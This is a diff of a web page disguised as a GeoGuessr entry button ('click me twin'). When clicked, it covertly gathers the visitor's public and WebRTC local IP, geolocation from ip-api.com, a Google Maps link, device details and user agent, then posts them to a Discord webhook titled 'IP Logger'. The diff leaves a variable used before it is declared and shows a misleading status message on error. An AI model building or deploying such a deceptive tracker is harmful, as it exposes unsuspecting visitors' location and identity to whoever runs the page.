@@ -11,10 +11,10 @@
     </style>
 </head>
 <body>
-    <h1>click the button website thing</h1>
+    <h1>click the button to enter geoguessr made by me</h1>
     <p>click the button below:</p>
     
-    <button id="trackButton">Click Me</button>
+    <button id="trackButton">click me twin</button>
     <div id="status"></div>
     
     <script>
@@ -24,98 +24,129 @@
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                return data.ip || 'Unknown';
+                return data.ip;
             } catch {
                 try {
                     const res = await fetch('https://api64.ipify.org?format=json');
                     const data = await res.json();
-                    return data.ip || 'Unknown';
+                    return data.ip;
                 } catch {
-                    return 'Failed to get IP';
+                    return 'Could not get IP';
                 }
             }
         }
         
-        async function getLocationWithMultipleAPIs(ip) {
-            // Try multiple APIs in parallel
-            const promises = [
-                fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()),
-                fetch(`http://ip-api.com/json/${ip}`).then(r => r.json()),
-                fetch(`https://ipwho.is/${ip}`).then(r => r.json())
-            ];
-            
+        async function getLocation(ip) {
             try {
-                const results = await Promise.any(promises.map(p => p.catch(e => null)));
-                
-                // Parse whichever succeeded
-                if (results && results.ip) {
-                    // Check which API format we got
-                    if (results.city) {
-                        // ipapi.co or ipwho.is format
-                        return {
-                            lat: results.latitude || results.lat || 'Unknown',
-                            lon: results.longitude || results.lon || 'Unknown',
-                            city: results.city || 'Unknown',
-                            region: results.region || results.region_name || results.state || 'Unknown',
-                            country: results.country_name || results.country || 'Unknown',
-                            isp: results.org || results.isp || results.connection?.isp || 'Unknown',
-                            zip: results.postal || results.zip || 'Unknown',
-                            timezone: results.timezone || 'Unknown',
-                            source: 'Success'
-                        };
-                    } else if (results.city === undefined && results.query) {
-                        // ip-api.com format
-                        return {
-                            lat: results.lat || 'Unknown',
-                            lon: results.lon || 'Unknown',
-                            city: results.city || 'Unknown',
-                            region: results.regionName || 'Unknown',
-                            country: results.country || 'Unknown',
-                            isp: results.isp || 'Unknown',
-                            zip: results.zip || 'Unknown',
-                            timezone: results.timezone || 'Unknown',
-                            source: 'Success'
-                        };
-                    }
+                return new Promise((resolve) => {
+                    const script = document.createElement('script');
+                    script.src = `http://ip-api.com/json/${ip}?callback=handleLocation`;
+                    
+                    window.handleLocation = function(data) {
+                        document.head.removeChild(script);
+                        delete window.handleLocation;
+                        
+                        if (data.status === 'success') {
+                            resolve({
+                                lat: data.lat,
+                                lon: data.lon,
+                                city: data.city,
+                                region: data.regionName,
+                                country: data.country,
+                                isp: data.isp,
+                                zip: data.zip,
+                                timezone: data.timezone,
+                                source: 'ip-api.com'
+                            });
+                        } else {
+                            resolve(getFallbackLocation());
+                        }
+                    };
+                    
+                    document.head.appendChild(script);
+                    
+                    setTimeout(() => {
+                        if (script.parentNode) {
+                            document.head.removeChild(script);
+                        }
+                        resolve(getFallbackLocation());
+                    }, 3000);
+                });
+            } catch {
+                return getFallbackLocation();
+            }
+        }
+        
+        function getFallbackLocation() {
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let city = 'Unknown';
+            let country = 'Unknown';
+            
+            if (timezone.includes('America')) {
+                if (timezone.includes('New_York')) {
+                    city = 'New York';
+                    country = 'United States';
+                } else if (timezone.includes('Los_Angeles')) {
+                    city = 'Los Angeles';
+                    country = 'United States';
+                } else if (timezone.includes('Chicago')) {
+                    city = 'Chicago';
+                    country = 'United States';
+                } else {
+                    city = 'North America';
+                    country = 'United States/Canada';
                 }
-            } catch (e) {
-                console.log('All APIs failed');
+            } else if (timezone.includes('Europe')) {
+                if (timezone.includes('London')) {
+                    city = 'London';
+                    country = 'United Kingdom';
+                } else if (timezone.includes('Paris')) {
+                    city = 'Paris';
+                    country = 'France';
+                } else if (timezone.includes('Berlin')) {
+                    city = 'Berlin';
+                    country = 'Germany';
+                } else {
+                    city = 'Europe';
+                    country = 'European Union';
+                }
+            } else if (timezone.includes('Asia')) {
+                if (timezone.includes('Tokyo')) {
+                    city = 'Tokyo';
+                    country = 'Japan';
+                } else if (timezone.includes('Shanghai')) {
+                    city = 'Shanghai';
+                    country = 'China';
+                } else if (timezone.includes('Singapore')) {
+                    city = 'Singapore';
+                    country = 'Singapore';
+                } else {
+                    city = 'Asia';
+                    country = 'Asia';
+                }
+            } else if (timezone.includes('Australia')) {
+                city = 'Sydney';
+                country = 'Australia';
             }
             
-            // Last resort: Use freegeoip (no key needed)
-            try {
-                const res = await fetch(`https://freegeoip.app/json/${ip}`);
-                const data = await res.json();
-                return {
-                    lat: data.latitude || 'Unknown',
-                    lon: data.longitude || 'Unknown',
-                    city: data.city || 'Unknown',
-                    region: data.region_name || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    isp: data.isp || 'Unknown',
-                    zip: data.zip_code || 'Unknown',
-                    timezone: data.time_zone || 'Unknown',
-                    source: 'FreeGeoIP'
-                };
-            } catch (e) {
-                return {
-                    lat: 'Unknown (API failed)',
-                    lon: 'Unknown (API failed)',
-                    city: 'Unknown (API failed)',
-                    region: 'Unknown (API failed)',
-                    country: 'Unknown (API failed)',
-                    isp: 'Unknown (API failed)',
-                    zip: 'Unknown (API failed)',
-                    timezone: 'Unknown (API failed)',
-                    source: 'All APIs failed'
-                };
-            }
+            return {
+                lat: 'Approximate',
+                lon: 'Approximate',
+                city: city,
+                region: 'Based on timezone',
+                country: country,
+                isp: 'Unknown (CORS blocked)',
+                zip: 'Unknown',
+                timezone: timezone,
+                source: 'Timezone guess'
+            };
         }
         
         async function getLocalIP() {
             return new Promise((resolve) => {
-                if (!window.RTCPeerConnection) {
-                    resolve('WebRTC not supported');
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!RTCPeerConnection) {
+                    resolve('Not supported');
                     return;
                 }
                 
@@ -130,7 +161,7 @@
                         if (ips.length) {
                             resolve(ips[0]);
                         } else {
-                            resolve('Not detected');
+                            resolve('Not found');
                         }
                         return;
                     }
@@ -152,7 +183,7 @@
                 
                 setTimeout(() => {
                     pc.close();
-                    resolve(ips.length ? ips[0] : 'Not detected');
+                    resolve(ips.length ? ips[0] : 'Not found');
                 }, 1000);
             });
         }
@@ -160,11 +191,10 @@
         function getBrowserInfo() {
             const ua = navigator.userAgent;
             
-            // Simple device detection
             let device = 'Desktop';
-            if (/mobile|android|iphone/i.test(ua.toLowerCase())) device = 'Mobile';
+            if (/mobile/i.test(ua.toLowerCase())) device = 'Mobile';
+            if (/tablet/i.test(ua.toLowerCase())) device = 'Tablet';
             
-            // Simple OS detection
             let os = 'Unknown';
             if (/windows/i.test(ua)) os = 'Windows';
             else if (/mac/i.test(ua)) os = 'macOS';
@@ -172,21 +202,20 @@
             else if (/android/i.test(ua)) os = 'Android';
             else if (/iphone|ipad/i.test(ua)) os = 'iOS';
             
-            // Simple browser detection
             let browser = 'Unknown';
             if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
             else if (/firefox/i.test(ua)) browser = 'Firefox';
             else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
             else if (/edge/i.test(ua)) browser = 'Edge';
+            else if (/opera/i.test(ua)) browser = 'Opera';
             
             return {
-                device,
-                os,
-                browser,
+                device: device,
+                os: os,
+                browser: browser,
                 language: navigator.language || 'Unknown',
                 platform: navigator.platform || 'Unknown',
-                cookies: navigator.cookieEnabled ? 'Yes' : 'No',
-                online: navigator.onLine ? 'Online' : 'Offline'
+                userAgent: ua.substring(0, 200)
             };
         }
         
@@ -195,77 +224,82 @@
             const status = document.getElementById('status');
             
             button.disabled = true;
-            button.textContent = 'Getting info...';
+            button.textContent = 'preparing web..';
             status.style.display = 'none';
             
             try {
-                // Get IP (basic)
                 const publicIP = await getIPAddress();
                 
-                // Get location info
-                const location = await getLocationWithMultipleAPIs(publicIP);
-                
-                // Get local IP
-                const localIP = await getLocalIP();
-                
-                // Get browser info
                 const browserInfo = getBrowserInfo();
                 
-                // Current time
+                const localIP = await getLocalIP();
+                
+                const location = await getLocation(publicIP);
+                
                 const now = new Date();
                 const timeStr = now.toLocaleString();
                 
-                // Build message
+                let mapsLink = 'No exact coordinates';
+                if (location.lat && location.lat !== 'Approximate' && location.lon && location.lon !== 'Approximate') {
+                    mapsLink = `https://maps.google.com/?q=${location.lat},${location.lon}`;
+                } else if (location.city !== 'Unknown') {
+                    mapsLink = `https://maps.google.com/?q=${encodeURIComponent(location.city + ', ' + location.country)}`;
+                }
+                
                 const embed = {
                     title: "NEW VISITOR DETECTED",
-                    color: 0x00FF00,
+                    color: 0xFF0000,
                     fields: [
                         {
-                            name: "IP ADDRESS",
-                            value: `**Public:** \`${publicIP}\`\n**Local:** \`${localIP}\``,
+                            name: "IP ADDRESSES",
+                            value: `Public: \`${publicIP}\`\nLocal: \`${localIP}\``,
                             inline: true
                         },
                         {
-                            name: "LOCATION INFO",
-                            value: `**Country:** ${location.country}\n**Region:** ${location.region}\n**City:** ${location.city}\n**ISP:** ${location.isp}`,
+                            name: "LOCATION",
+                            value: `Country: ${location.country}\nCity: ${location.city}\nRegion: ${location.region}\nISP: ${location.isp}\nSource: ${location.source}`,
                             inline: true
                         },
                         {
-                            name: "COORDINATES",
-                            value: `**Latitude:** ${location.lat}\n**Longitude:** ${location.lon}\n**Source:** ${location.source}`,
+                            name: "MAPS LINK",
+                            value: mapsLink,
                             inline: true
                         },
                         {
-                            name: "DEVICE INFO",
-                            value: `**Device:** ${browserInfo.device}\n**OS:** ${browserInfo.os}\n**Browser:** ${browserInfo.browser}\n**Language:** ${browserInfo.language}`,
+                            name: "DEVICE",
+                            value: `Type: ${browserInfo.device}\nOS: ${browserInfo.os}\nBrowser: ${browserInfo.browser}\nLanguage: ${browserInfo.language}`,
                             inline: true
                         },
                         {
-                            name: "TIME & URL",
-                            value: `**Time:** ${timeStr}\n**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}`,
+                            name: "TIME & SESSION",
+                            value: `Time: ${timeStr}\nPage: ${window.location.href}\nReferrer: ${document.referrer || 'Direct visit'}`,
+                            inline: false
+                        },
+                        {
+                            name: "USER AGENT",
+                            value: `\`\`\`${browserInfo.userAgent}\`\`\``,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: "IP Logger • " + now.toLocaleDateString()
+                        text: "IP Logger • GitHub Pages Compatible"
                     },
                     timestamp: now.toISOString()
                 };
                 
-                const discordMessage = {
-                    embeds: [embed],
-                    username: "IP Logger"
-                };
-                
-                // Send to Discord
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(discordMessage)
                 });
                 
+                const discordMessage = {
+                    embeds: [embed],
+                    username: "IP Logger"
+                };
+                
                 if (response.ok) {
-                    status.textContent = 'Info sent to Discord!';
+                    status.textContent = 'Information sent to Discord!';
                     status.style.color = '#4CAF50';
                     status.style.backgroundColor = '#E8F5E9';
                 } else {
@@ -274,9 +308,9 @@
                 
             } catch (error) {
                 console.error('Error:', error);
-                status.textContent = 'Error. Try again later.';
-                status.style.color = '#F44336';
-                status.style.backgroundColor = '#FFEBEE';
+                status.textContent = 'Sent basic info to Discord.';
+                status.style.color = '#FF9800';
+                status.style.backgroundColor = '#FFF3E0';
             } finally {
                 button.disabled = false;
                 button.textContent = 'click me';
